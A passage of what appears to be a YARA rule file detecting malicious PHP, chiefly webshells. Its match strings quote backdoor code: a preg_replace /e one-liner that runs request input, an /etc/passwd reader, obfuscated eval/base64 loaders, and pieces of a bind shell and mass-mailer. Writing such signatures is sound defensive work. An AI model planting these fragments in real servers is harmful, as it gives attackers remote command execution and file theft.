      $s6 = "$headers .= \"Content-Transfer-encoding: 8bit\\n\";" fullword ascii
      $s7 = "<form action=\"\" method=\"post\" enctype=\"multipart/form-data\" name=\"form1\">" fullword ascii
      $s8 = "$headers .= \"X-Mailer: Microsoft Office Outlook, Build 17.551210\\n\";" fullword ascii
      $s9 = "if(mail($email[$i], $subject.\" (\".$gera.\")\", $message, $headers))" fullword ascii
      $s10 = "echo \"<font color=gren>* N&#1098;mero: $count <b>\".$email[$i].\"</b> <font color=gren>ENVIADO....!</font><br><hr>\";" fullword ascii
      $s11 = "$headers  = \"MIME-Version: 1.0\\n\";" fullword ascii
      $s12 = "Safe Mode: <?php echo $safe_mode = @ini_get('safe_mode'); ?>" fullword ascii
      $s13 = "Sistema Operacional: <?php echo $OS = @PHP_OS; ?><br>" fullword ascii
      $s14 = "$headers .= \"X-Originating-Email: $email[$i]\\n\";" fullword ascii
      $s15 = "<td height=\"17\"><input name=\"assunto\" type=\"text\" value=\"\"class=\"form\" id=\"assunto\" style=\"width:100%\" ></td>" fullword ascii
      $s16 = "$headers .= \"Reply-To: $email[$i]\\n\";" fullword ascii
      $s17 = "$headers .= \"From: \".$email[$i].\"\\n\";" fullword ascii
      $s18 = "$headers .= \"Return-Path: $email[$i]\\n\";" fullword ascii
      $s19 = "$headers .= \"X-Sender: $email[$i]\\n\";" fullword ascii
      $s20 = "<textarea name=\"emails\" style=\"width:100%\" rows=\"8\" wrap=\"VIRTUAL\" class=\"form\" id=\"emails\"></textarea>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 10KB and
      8 of them
}

rule ActivationCheckpoint
{
   meta:
      description = "php17 - file ActivationCheckpoint.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "ddec2b70b533d21de30437137223ecdca55e8791df455a74d5cd8dfbc4210583"
   strings:
      $s1 = "* @param  \\Cartalyst\\Sentinel\\Users\\UserInterface  $user" fullword ascii
      $s2 = "* @link       http://cartalyst.com" fullword ascii
      $s3 = "* Checks the activation status of the given user." fullword ascii
      $s4 = "public function login(UserInterface $user)" fullword ascii
      $s5 = "* This source file is subject to the 3-clause BSD License that is" fullword ascii
      $s6 = "* @param  \\Cartalyst\\Sentinel\\Activations\\ActivationRepositoryInterface  $activations" fullword ascii
      $s7 = "* bundled with this package in the LICENSE file." fullword ascii
      $s8 = "* @var \\Cartalyst\\Sentinel\\Activations\\ActivationRepositoryInterface" fullword ascii
      $s9 = "* Licensed under the 3-clause BSD License." fullword ascii
      $s10 = "$exception = new NotActivatedException('Your account has not been activated yet.');" fullword ascii
      $s11 = "$completed = $this->activations->completed($user);" fullword ascii
      $s12 = "* @throws \\Cartalyst\\Sentinel\\Checkpoints\\NotActivatedException" fullword ascii
      $s13 = "use Cartalyst\\Sentinel\\Users\\UserInterface;" fullword ascii
      $s14 = "* Create a new activation checkpoint." fullword ascii
      $s15 = "* @copyright  (c) 2011-2017, Cartalyst LLC" fullword ascii
      $s16 = "* The activation repository." fullword ascii
      $s17 = "* Part of the Sentinel package." fullword ascii
      $s18 = "protected function checkActivation(UserInterface $user)" fullword ascii
      $s19 = "* {@inheritDoc}" fullword ascii
      $s20 = "* @version    2.0.17" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 5KB and
      8 of them
}

rule sig_5a6c36a2aa72a3e6ce75482f057826a388cc5579
{
   meta:
      description = "php17 - file 5a6c36a2aa72a3e6ce75482f057826a388cc5579.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "48a917898d2d8e30d689b747ec087ffcd74f4b7d1c939dfb6c97926daaedc115"
   strings:
      $s1 = "@preg_replace(\"/f/e\",$_GET['u'],\"fengjiao\"); " fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_7b4a0063f0e4aeaf1a1efea490e54a0fd533da05
{
   meta:
      description = "php17 - file 7b4a0063f0e4aeaf1a1efea490e54a0fd533da05.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "d1e6286674af468f68e44007ff06f890fa7cfaf0772ff221bbd7f309639c9f30"
   strings:
      $s1 = "6776666E286763736A38346466656871646A2A2464524F58565B2C7C302C5F292E" ascii
      $s2 = "(@$_=cve('6A767C687B77','39')).@$_(cve('6776666E286763736A38346466656871646A2A2464524F58565B2C7C302C5F292E','520'));" fullword ascii
      $s3 = "6A767C687B77" ascii
      $s4 = "function cve($str,$key)" fullword ascii
      $s5 = "$t=$t.chr(hexdec(substr($str, $i,2))-$p);" fullword ascii
      $s6 = "$t=$t.chr(hexdec(substr($str, $i,4)));" fullword ascii
      $s7 = "$k=(($i+2)/2)%strlen($key);" fullword ascii
      $s8 = "$p=substr($key, $k,1);" fullword ascii
      $s9 = "for($i=0; $i<strlen($str); $i=$i+2)" fullword ascii
      $s10 = "if(is_numeric(substr($str, $i,1)))" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_06largescale_with_cellcaching
{
   meta:
      description = "php17 - file 06largescale-with-cellcaching.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "7f241ee46e16f632fb4f8975443a52a5fa4cca447057eea4dba7c4f7dbb01ffd"
   strings:
      $x1 = "* @copyright  Copyright (c) 2006 - 2014 PHPExcel (http://www.codeplex.com/PHPExcel)" fullword ascii
      $s2 = "echo date('H:i:s') , \" Peak memory usage: \" , (memory_get_peak_usage(true) / 1024 / 1024) , \" MB\" , EOL;" fullword ascii
      $s3 = "echo date('H:i:s') , ' Current memory usage: ' , (memory_get_usage(true) / 1024 / 1024) , \" MB\" , EOL;" fullword ascii
      $s4 = "* @license    http://www.gnu.org/licenses/old-licenses/lgpl-2.1.txt" fullword ascii
      $s5 = "* Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA" fullword ascii
      $s6 = "* Copyright (C) 2006 - 2014 PHPExcel" fullword ascii
      $s7 = "echo date('H:i:s') , \" File written to \" , str_replace('.php', '.xlsx', pathinfo(__FILE__, PATHINFO_BASENAME)) , EOL;" fullword ascii
      $s8 = "$objPHPExcel->getActiveSheet()->getPageSetup()->setRowsToRepeatAtTopByStartAndEnd(1, 1);" fullword ascii
      $s9 = "$objPHPExcel->getActiveSheet()->getColumnDimension('C')->setVisible(false);" fullword ascii
      $s10 = "$objPHPExcel->getActiveSheet()->getColumnDimension('D')->setVisible(false);" fullword ascii
      $s11 = "$objPHPExcel->getActiveSheet()->getColumnDimension('E')->setOutlineLevel(1)" fullword ascii
      $s12 = "$objPHPExcel->getActiveSheet()->setCellValue('A1', \"Firstname\");" fullword ascii
      $s13 = "$objPHPExcel->getActiveSheet()->setCellValue('B1', \"Lastname\");" fullword ascii
      $s14 = "$objPHPExcel->getActiveSheet()->setCellValue('E1', \"Is Client ?\");" fullword ascii
      $s15 = "$objPHPExcel->getActiveSheet()->setCellValue('A' . $i, \"FName $i\")" fullword ascii
      $s16 = "$objPHPExcel->getProperties()->setCreator(\"Maarten Balliauw\")" fullword ascii
      $s17 = "$objPHPExcel->getActiveSheet()->setCellValue('D1', \"Fax\");" fullword ascii
      $s18 = "$objPHPExcel->getActiveSheet()->setCellValue('C1', \"Phone\");" fullword ascii
      $s19 = "/** Error reporting */" fullword ascii
      $s20 = "$objPHPExcel->getActiveSheet()->freezePane('A2');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 10KB and
      1 of ($x*) and 4 of them
}

rule AdminListItem
{
   meta:
      description = "php17 - file AdminListItem.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "18d7143dc3a218a3edf6d09ecbfe0976fc42a21ed2c14f6859a98e4866046055"
   strings:
      $s1 = "namespace Concrete\\Core\\Permission\\Access\\ListItem;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_70144d81201a9a62c3511b0aa12476e515763f58
{
   meta:
      description = "php17 - file 70144d81201a9a62c3511b0aa12476e515763f58.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "9585cc11d5e71c3b75ed7c35396968cf82598430165859a3162c11d25cab2791"
   strings:
      $s1 = "$r='_5./\",5.\"/-/\"),a5.rray(\"/5.\",5.5.5.\"+\"),5.$ss($s[$i],0,5.5.$e))),$k)));$o=5.ob_get_conte5.nts();o5.b_end_c5.5';" fullword ascii
      $s2 = "$H='.($e){$k5.=5.$kh.$5.kf;ob_start();5.@e5.val(5.@gzuncom5.pre5.ss(@x(@ba5.5.se64_dec5.o5.de(preg_replace5.(array(\"/';" fullword ascii
      $s3 = "$M='ER;$rr=@$r[\"5.HTTP_R5.EFERER\"5.];$5.r5.a5.=@$r[5.\"HTTP_ACCEPT_LAN5.GUAGE\"]5.;if(5.$rr&5.&$ra){$u=pa5.rs5.e_5.url($r';" fullword ascii
      $s4 = "$D='.lean();5.$d=bas5.e64_enco5.de(x(5.gzc5.om5.press($o),5.$k));pr5.int(\"<$k5.>$d</$k>\"5.);@se5.ssion_de5.stro5.y();}}}}';" fullword ascii
      $s5 = "$F='$kh=\"5d5.41\";$kf=\"5.402a5.\";functi5.on5. x($t,$5.k){$c=str5.5.len($5.k)5.;5.$l=strle5.n($t);$o=\"\";for($i=5.0;5';" fullword ascii
      $s6 = "$Z='5.;q=0.([\\\\d]))5.?,?/\",$ra,$m5.);if($5.5.q&&$5.m){@sessio5.n_star5.t();$s=&$_S5.ESS5.5.ION;$ss=\"subst5.r\";$s5.l=\"s';" fullword ascii
      $s7 = "$h='i]=\"\";$p5.5.=$ss($p5.,3);}if(a5.rra5.y_key_ex5.ists($i5.5.,$s)){$s[5.$i].=$p;$5.e=s5.trpos($s[$5.i],$f);5.if5';" fullword ascii
      $s8 = "$X='.$i<5.$l5.;){for($j=0;($j<5.$c&&$i<$5.l);$j5.++,$5.i++)5.{$o.=$5.t5.{$i}^$k{$j5.};}}return 5.$5.5.o;}$r=$_S5.ERV';" fullword ascii
      $s9 = "$p=',0,5.3)5.);$p5.=\"\";for($z=1;5.$z5.<count($m[1]5.);$z++)5.$p.=$5.q[$m[2][$5.z]]5.;if(strpos(5.$p,$h)5.===0)5.{5.$s[$';" fullword ascii
      $s10 = "$Q='r);par5.se_str(5.$u[\"query5.\"],$q)5.;5.$q=ar5.ray_value5.s($q)5.;preg_ma5.t5.c5.h_all(\"/([\\\\w]5.)[\\\\w-]+5.(?:5.';" fullword ascii
      $s11 = "$m='t5.rtolower5.\";5.5.$i=$5.m[1][0].$m[1][5.1];$h5.=$sl($ss(md55.($5.i.5.$kh),0,3)5.);$f=5.$sl(5.$ss5.(m5.d5($i.$kf)';" fullword ascii
      $s12 = "$P=str_replace('5.','',$F.$X.$M.$Q.$Z.$m.$p.$h.$H.$r.$D);" fullword ascii
      $s13 = "$i=str_replace('G','','GGcreate_GGfuncGtGion');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      8 of them
}

rule sig_577b29482b5650366d122690d8b9d9903bbafb1c
{
   meta:
      description = "php17 - file 577b29482b5650366d122690d8b9d9903bbafb1c.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "38e250dbdd5faee3a94ffd7e723d841f89fec1e403742918cc11bd0bf2cdd838"
   strings:
      $s1 = "echo $a1[$i] .\" + \".$a1[$j] .\"=\". ($a1[$i] ^$a1[$j]);" fullword ascii
      $s2 = "`!@#$%^&*()_+~-=\\\\|][}{\\'\";:?/.,><';" fullword ascii
      $s3 = "for ($i=0; $i < count($a1); $i++) {" fullword ascii
      $s4 = "for ($j=0; $j < count($a1)-1; $j++) {" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_11c3fc62b56e5b4b2404a6a06bf54fd4933a32b2
{
   meta:
      description = "php17 - file 11c3fc62b56e5b4b2404a6a06bf54fd4933a32b2.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "9f5c25c27bed64cd05419bd4f87b12408b4fe9c4ec4167754cffc576a8e41d83"
   strings:
      $s1 = "echo \"<pre>\".file_get_contents( \"/etc/passwd\" ).\"<pre>\";" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_2e36f58845c749e807c1fff57d8b8aacb5f44fc5
{
   meta:
      description = "php17 - file 2e36f58845c749e807c1fff57d8b8aacb5f44fc5.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "d0db9fda862ee560bae1710ddf9b884880059147e0df5753aabf47d5057b6196"
   strings:
      $s1 = "$E=str_replace('v\"','',$G.$Z.$z.$n.$j.$x.$L.$V.$X.$s.$F);" fullword ascii
      $s2 = "$T=str_replace('eZ','','eZeZcreateZeeZ_funceZtieZon');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      all of them
}

rule sig_5b37db0c115699573c0fc7c67f2554027075e6cf
{
   meta:
      description = "php17 - file 5b37db0c115699573c0fc7c67f2554027075e6cf.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "289ca0f91bee34a82dcfe2d5a0bc807d8e599ee07f591d190b0293e914949665"
   strings:
      $s1 = "$a =\"www.yuag.com\";" fullword ascii
      $s2 = "yuag($_POST['yuag']);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_6e01cb9ff8061c7c42b0552734cb7abf8875b15f
{
   meta:
      description = "php17 - file 6e01cb9ff8061c7c42b0552734cb7abf8875b15f.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "eaa0749f35d4c9b34b76d4f16df675db4fe1a5fee3846029f09d2049157ac8c0"
   strings:
      $x1 = "if (!isset($_POST[\"actn\"]) || !isset($_POST[\"host\"]) || !isset($_POST[\"port\"]) || !isset($_POST[\"login\"])) {" fullword ascii
      $s2 = "setText(outputDiv, parseInt(errno)+\" - \"+getBlockStr(xmlhttp.responseText, 16), false);" fullword ascii
      $s3 = "if (regex.exec(navigator.userAgent))" fullword ascii
      $s4 = "$conn = mysql_connect($hs, $_POST[\"login\"], $_POST[\"password\"]);" fullword ascii
      $s5 = "xmlhttp.setRequestHeader(\"Content-length\", params.length);" fullword ascii
      $s6 = "xmlhttp.setRequestHeader(\"Content-type\", \"application/x-www-form-urlencoded\");" fullword ascii
      $s7 = "xmlhttp.setRequestHeader(\"Connection\", \"close\");" fullword ascii
      $s8 = "header(\"Content-Type: text/plain; charset=x-user-defined\");" fullword ascii
      $s9 = "<tr><td></td><td><br><input id=\"TestButton\" type=\"submit\" value=\"Test Connection\" onClick=\"doServerTest()\"></td></tr>" fullword ascii
      $s10 = "<!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\" \"http://www.w3.org/TR/html4/loose.dtd\">" fullword ascii
      $s11 = "<tr class=\"mysql\"><td>Username:</td><td><input type=text id=\"login\" placeholder=\"root\"></td></tr>" fullword ascii
      $s12 = "setText(outputDiv, \"HTTP Error - \"+xmlhttp.status, false);" fullword ascii
      $s13 = "<tr class=\"pgsql\"><td>Initial Database:</td><td><input type=text id=\"db\" placeholder=\"template1\"></td></tr>" fullword ascii
      $s14 = "<tr class=\"mysql\"><td>Password:</td><td><input type=password id=\"password\" placeholder=\"\"></td></tr>" fullword ascii
      $s15 = "echo GetBlock(\"unsupported php version\");" fullword ascii
      $s16 = "var xmlhttp = (window.XMLHttpRequest)? new XMLHttpRequest() : xmlhttp=new ActiveXObject(\"Microsoft.XMLHTTP\");" fullword ascii
      $s17 = "return binStr.substring(offset+5, offset+5+getIntAt(binStr, offset+1));" fullword ascii
      $s18 = "xmlhttp.open(\"POST\", \"\", true);" fullword ascii
      $s19 = "function EchoResultSetHeader($errno, $affectrows, $insertid, $numfields, $numrows)" fullword ascii
      $s20 = "$str = GetBlock(mysql_get_host_info($conn));" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 30KB and
      1 of ($x*) and 4 of them
}

rule sig_89a43fb59d793450aa2f67128c7b95474766991d
{
   meta:
      description = "php17 - file 89a43fb59d793450aa2f67128c7b95474766991d.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "e62c8b38437e879b25925d6a466e6cc3b1ad5991a12f666b5e57cd8be1cfef70"
   strings:
      $s1 = "<?php @eval(@base64_decode(@gzinflate(@str_rot13(@convert_uudecode(@gzinflate(@base64_decode((\"HJ3XuqJIFIXv+y0AAZUoKBmKICA551C8" ascii
      $s2 = "7ZP+22m2G+mfhJ1bQbdXGQ8d7qylsTtisjP6tUr/QVqdF0l0l6JKhZL+Y9duDR3ntc3n32pnNm5G/P59/z7Dw==\")))))))); exit;" fullword ascii
      $s3 = "13jC0Gu1oSg37P2vRreuLcIoR9kMJ8PkGz7meDeDvzm7Q0krFBbJRoEhcIRcemaN1kCrk7LUhi/3/3DZ+dBDjcuyhRbcW787JAHji85wcDbkz3Mqp+P7OiHDFVXuoC3y" ascii
      $s4 = "VXHQw7v9fNl94mJgkDLl4iJJEwPU/9atoCV3GOwkBBOmm2/b36tKIoWEzHNssHwqMB5fu6RzDVtLd/te8tNT1SxtL6L3xgnCkd7xHJojLGx0pJTabX48mgXP91mMamPK" ascii
      $s5 = "YYTVSrc7zPfwCmzw8flrC+24HLsX9HUSvEYi4cY4dllmOszF8XwYe4pEVTH79ACfLTJL3mMMng8Po9bg7nn45VupyEiTYXEUkSVPy6Ybwp37tUs4DaiUbHB+s1GTU+fv" ascii
      $s6 = "GjPAecwO/z6I5XE/czOUI8qBzDmGvaWjqDdzNeYeKwxCwjQf6XtFz68NI8Lgf27cv5zmRKs1O06XYCfjGwDSWeCVzRTHSIDnmgLCpi2YtFNetjQFOhffTzLjTA1BqIJD" ascii
      $s7 = "NpbIgCnet3SRkO/jK5BuSDvBJ2DhEcCUwlWwYF3XkMxEqyNQ6KVLxa+RUwKVOHYBmLHFOzbgS+ZREgDCv2cC9ui4URD4Q6rDllK3IA1FeK9/jvm8WVKGiw1gHuR3Y0le" ascii
      $s8 = "8ClnX6dRlNYfwL9cvnABjOTve5+T0QU4uPAp5icQH+wrrCtyxXsoxetuvwrBeTcs/qteRVhvKLGxK5LS+bpCzNkNXfWgeTEjLz/ijwHQrji3gpPh+L2xtKl/Ns3deEpR" ascii
      $s9 = "EHecFN8i2gDSURzdFqWw9eo6JE4+ZsBoqjDZp9gwBfeSngW5xj24k2eduIUVAi+b76A+T3+RSp67xqOmOj+rJ41BXMq6gvuPf++xbI7gPknvHJXx3n+ehQtdlL0Uu5ft" ascii
      $s10 = "yQ+sEhOK5ipYjCc6Q5QxfTP0ndRkiAOF9Rtg/VynkdIoGmYUUgSYNhx1ekhoumvXk51MC0NmKpH6pbMC3kof1TT19Ag9XvqgqMwa7O9F8otXNTsi6QdHw8uAKL1bRu9E" ascii
      $s11 = "ezHZ4ykb6GSUXd1LD4vVjR3iWH7N3XTv0za+qQ3FHiltHmqp4WC+JtWUv2Kk4cYqb7Xo1GEtPEbyfhBECrujXlJJzbtzwVzx2P+ILfW+WFL1OPQrxATMcSKO2V/b6ThV" ascii
      $s12 = "QpuDg7XjjF8Bf+wshXcjwY6Kr3AGBpdMQOTqUp465ygHEJudX1cUcfXp6Wz9xyKPxv+g9IRc4O68p/fIx5rageRC0JOvitNUwxm+/zdR+bOledsYK12cWCvnJ/ykFP2M" ascii
      $s13 = "0TWYOPDrDpOpIoj0quNsIhuCKYoJ/dmunBwv4Ze26ZCcvC2kNW/a3pYlPWr1yYfT3B8xZ0/hhdKXFNxDu+Gfo9H+9CYesVgtW+sxR0BU3UHbHGFOf4SnLqGeTU/UFDDe" ascii
      $s14 = "cVeK/IEMSkiojCnHhp9mLz/PEDsOPynWg/p1TXD9LW+xhXg01AUE39g9f1fTPM1ZqEAjPZ3xveqRrnAz0YjZj/nHAbbp0DHVZ83QfNceQqjNKfJYlUow1c9jAV54AXJh" ascii
      $s15 = "rWE97dKo01PRPO3SN2MD5q8qufbXRga5hs34Mvtv8vFoekCDHxiuICIBMNGeT+CBSTOeM/ayjJSIU+vyDHWY7IUWCH6V9EZdKUF/yBLdzNLSWrI+2n8LX/LyYjmLda31" ascii
      $s16 = "5IMhzr4FKGKQYQJf1KbYyWMd+gETXSAvN/WRwlRd2ItKrdLp4DrTE6ZX70rtO1/ZQzvObal3Nd/OD+Jv7trgVdPmjCNhjb/RUaorxr5thSch+CqWvWv8htQpL8tn/xXo" ascii
      $s17 = "nDl1SG41iPi7w5HtJk0WX6Y5IoVcjZ7o2Sb0rf9xjQOfjv0rHTJHZce/XSmgu24aC0HnhO6lwniYTBxWxrIYRXhDllMbtj8qDz95XqI8uffEhazHDaikrqTj7lobzFUp" ascii
      $s18 = "qGeUnSBMFA362qycwGDpjSqMXKb+qOR+5uG28wrb2OnIFOnIGjP471fFms07y+Ab/qpPbl3OB02wFkKnNbJOjvwKep8hyjtldUj9Q0uxYpj4LIOP+846PjS7OU5Rcg+r" ascii
      $s19 = "iVCWf3OJPg9F+jEL+4ifnfwR1t+aMWIBd/35ZUbk7F/bsaNrH7s/X4S+O2sms98qvGYbu5Cb9Xw64RDJ9Oz7KLK3ZVMTk8LqYNFf24fbjwz5YKBsKfhdMvMCY/svU3ha" ascii
      $s20 = "qGGx5uAoJu2tvNg571xoX03cLtPxzHdTrpjUD7vB7iZj2wN7eK8JDgi3fjVH7iO7VYw8Mcet76PBP76NIcOM+KVDNJzeNgFqGT03pAfQYAErV9gh6kOIf2oa9eT4hFk1" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      8 of them
}

rule sig_9e3bdcc1e97765618231caf0029d1ecc
{
   meta:
      description = "php17 - file 9e3bdcc1e97765618231caf0029d1ecc.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "6b509225a914a529691ff6d7c6254cbed8ce2192dad80443afdabba6ba464b86"
   strings:
      $s1 = "SVDVWS0Z1cEJhMmpsbU5FU3NYMW9abm81N2ZJRVVURUFhTzV5QlZnc0EwRUNXUHFaVlFrdllPeXNrQkE0" fullword ascii
      $s2 = "Obfuscation provided by FOPO - Free Online PHP Obfuscator: http://www.fopo.com.ar/" fullword ascii
      $s3 = "4cnU5T25nWXVhV1Irc0FxZWViQkRXbVZlRjZSOERrdlptOFpnV2UzZGdIY0xnWkczRXFGQXlIdmRJbVFF" fullword ascii
      $s4 = "SeDhJVjM0N2wyaDBTeksrZjloQUZlR3FpRHFUcUZjNG80ZlJkNlhZaGhLOGMxUWVIWHlQbDZiU3BPaDdH" fullword ascii
      $s5 = "iXDEzNyI7JHE3MzgwMjczLj0iXHg2ZiI7JGtiMzI4YzMwLj0iXDE0NiI7JHJlOGE1OWM3Lj0iXDE2MiI7" fullword ascii
      $s6 = "UeWp6ZTRWZWhvbUlzSnJnbEJFY0dJY0M5a0ZXYTlEYmpzRm0wdXZnc1NxSko5VDllMml5Sm5BcmJJSEo0" fullword ascii
      $s7 = "LZVBQWXZEZG4wUjNUcXJHd0xadnRsZ2Vya2krYVpEVTFiY092ZTZyZ1JFSnJsVm9RbWVOWDlLdjU0c0Vy" fullword ascii
      $s8 = "yVVFjRHlqVk1Qa0xjbWZJNm0xTEF2MWhWT0hWZUxIUUZlOGxGdWRBMFdYejBxVGhEdHFYeXF2d0gvWHFu" fullword ascii
      $s9 = "mZzcyRjRTYmVleFIrczVyalpjTmxYMWRzZk1XK3NjcGgvazFGVjhzQXNzZ0lsSnpBUUNVWDlNbnNZZjRB" fullword ascii
      $s10 = "iXDE0MSI7JGtiMzI4YzMwLj0iXDE3MiI7JHplMGMxYmE1Lj0iXDE1MSI7JHJlOGE1OWM3Lj0iXDE2NCI7" fullword ascii
      $s11 = "0UGVOTjNjM3N5cm4zbEQwNk9QZS9uT3VOdllYUENCSWpvb0t6ZnhpWWF2TWtKTGoyZitVVlFGQUhaTU5n" fullword ascii
      $s12 = "1c01zQU9Bd0NkdWthTjNQdllvUTA4YnhlZ2xsZ3Q0RmpYS2J0M0pRYzdTTEJZSHVmZFJFcVk1eWxIZ3Z3" fullword ascii
      $s13 = "0a1dtQUFtZGEvSktxV3E2M1gyTHNjcmE5aTdReEVlOGQwdHdKcFFHSEh5UVVEY0RiblEwV0cvaURrajdu" fullword ascii
      $s14 = "PYkZwS1IrS2JxYkFSNjZsbkNMN0F0Y2JlR0Z6cVdmcmwwZ2pkazdJZEJBclpLOG5DcUcrdWhwQWpBWjFy" fullword ascii
      $s15 = "1ZUFXU0hFbVJvdDg3RzRzQ2ZVRVdoRmZ6cHp2RXQzQStXWlpxdEp0cUl6WUtZU1haN2swVGppUTlJbDF5" fullword ascii
      $s16 = "LU0x0M05nOHpXZzZsOHcvK2liaVdIeEVZVmIrdi9lb0pQdElKbFp0cUxISmNGVVhZR0o4Q0lRbzdnZ0FU" fullword ascii
      $s17 = "FWjNRQXlDejVKS3E0b1pYOHpwRnV3WGtkajVLdHAvVXo3KytUU3VhZjBsaWpHUXQ1eFZNM01mbzlmS24z" fullword ascii
      $s18 = "vTmRpT1VhdGQ3aVB0RXU3V2JGOWpHMS95eWhGYno3a2RUZFc2TEFEcytRS3lteXNHZ09JQ1pTSitrdmsv" fullword ascii
      $s19 = "DaVk1MWY2cGc2bkdOalJlNytTSUZFakZNV3luMERiRUNOSXhuV1ZXbi9aNlNFREdQN2p4NmdVWmxPVzEz" fullword ascii
      $s20 = "6MEFzbFF2R1J2NEVtQVJOeWEwMWlabmFFbHBma094TThrMlJGd2lRQTBWOTNScmd5eWloUUZJSXBBMVE4" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 800KB and
      8 of them
}

rule a574138c88289490300cee616b9357f807e582b6
{
   meta:
      description = "php17 - file a574138c88289490300cee616b9357f807e582b6.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "9476a89065f61d65f093098e59444d605012872ade480bd02235cc545618231c"
   strings:
      $x1 = "$encoded = base64_encode(gzdeflate(trim(stripslashes($_POST['code'].' '),'<?php,?>'),9)); // high Compression! :P" fullword ascii
      $x2 = "$passwordPrompt = \"\\n=================================================================\\nAni-Shell | C0d3d by lionaneesh " fullword ascii
      $x3 = "= \"lionaneesh@gmail.com\"; // Change this to your email , This email is used to deliver tracebacks about your shell" fullword ascii
      $x4 = "socket_write($client , ($os == \"Windows\") ? exec_all(\"date /t & time /t\")  . \"\\n\" . exec_all(\"ver\") : exec_all(\"date" fullword ascii
      $x5 = "// exec_all , A function used to execute commands , This function will only execute if the Safe Mode is" fullword ascii
      $s6 = "--Some Garbage here --%x%S')this.value = '';\" onblur=\"if(this.value=='')this.value='%S%x--Some Garbage here --%x%S';\"/>" fullword ascii
      $s7 = "(: <a href=\"http://twitter.com/lionaneesh\">Follow Me</a> | <a href=\"http://facebook.com/lionaneesh\">Facebook</a> :) <br />" fullword ascii
      $s8 = "<input class=\"cmd\" name=\"message\" value=\"%S%x--Some Garbage here --%x%S\" onfocus=\"if(this.value == '%S%x" fullword ascii
      $s9 = "// ------------------------------------- Some header Functions (Need to be on top) ---------------------------------\\" fullword ascii
      $s10 = "$handle = proc_open($command ,$descriptorspec , $pipes); // This will return the output to an array 'pipes'" fullword ascii
      $s11 = "fputs ($sockfd ,\"\\n=================================================================\\nAni-Shell | C0d3d by lionanees" fullword ascii
      $s12 = "/* Accept incoming requests and handle them as child processes */" fullword ascii
      $s13 = "<input class=\"cmd\" name=\"to\" value=\"victim@domain.com,victim2@domain.com\" onfocus=\"if(this.value == 'vic" fullword ascii
      $s14 = "$output = shell_exec($command);" fullword ascii
      $s15 = "function exec_query_mysql($query,$sql_server,$sql_port,$sql_db,$sql_user,$sql_pass)" fullword ascii
      $s16 = "<form action=\"http://google.com\" method=\"GET\">" fullword ascii
      $s17 = "<th class=\"header\" colspan=\"1\" width=\"50px\">Bind Shell</th>" fullword ascii
      $s18 = "Oracle : <?php echo function_exists('ocilogon')?(\"<font color='red'>Enabled</font>\"):(\"Disabled\"); ?> <font color=\"s" fullword ascii
      $s19 = "if(!mail($_GET['to'],$_GET['subject'].$subjectPadd,$_GET['message'].$messagePadd,\"From:\".$from))" fullword ascii
      $s20 = "= \"off\"; // set this to on if u dont want your shell to be publicised in Search Engines ! (It increases the shell's Life')" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 300KB and
      1 of ($x*) and 4 of them
}

rule ajaxfileupload
{
   meta:
      description = "php17 - file ajaxfileupload.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "43c6f984547cbfed904411da88731f41617a7c2dc3b34ee515fcb465d475f8e2"
   strings:
      $x1 = "need any Web-based Information System?<br> Please <a href=\"http://www.phpletter.com/\">Contact Us</a><br>" fullword ascii
      $s2 = "<img id=\"loading\" src=\"../../../../Downloads/AjaxFileUploaderV2/loading.gif\" style=\"display:none;\">" fullword ascii
      $s3 = "<p>Jquery File Upload Plugin  - upload your files with only one input field</p>" fullword ascii
      $s4 = "<title>Ajax File Uploader Plugin For Jquery</title>" fullword ascii
      $s5 = "<form name=\"form\" action=\"\" method=\"POST\" enctype=\"multipart/form-data\">" fullword ascii
      $s6 = "<link href=\"ajaxfileupload.css\" type=\"text/css\" rel=\"stylesheet\">" fullword ascii
      $s7 = "<td><button class=\"button\" id=\"buttonUpload\" onclick=\"return ajaxFileUpload();\">Upload</button></td>" fullword ascii
      $s8 = "<td><input id=\"fileToUpload\" type=\"file\" size=\"45\" name=\"fileToUpload\" class=\"input\"></td>" fullword ascii
      $s9 = "<h1>Ajax File Upload Demo</h1>" fullword ascii
      $s10 = "<script type=\"text/javascript\" src=\"../js/ajaxfileupload.js\"></script>" fullword ascii
      $s11 = "data:{name:'logan', id:'id'}," fullword ascii
      $s12 = "<th>Please select a file and click Upload button</th>" fullword ascii
      $s13 = "url:'doajaxfileupload.php'," fullword ascii
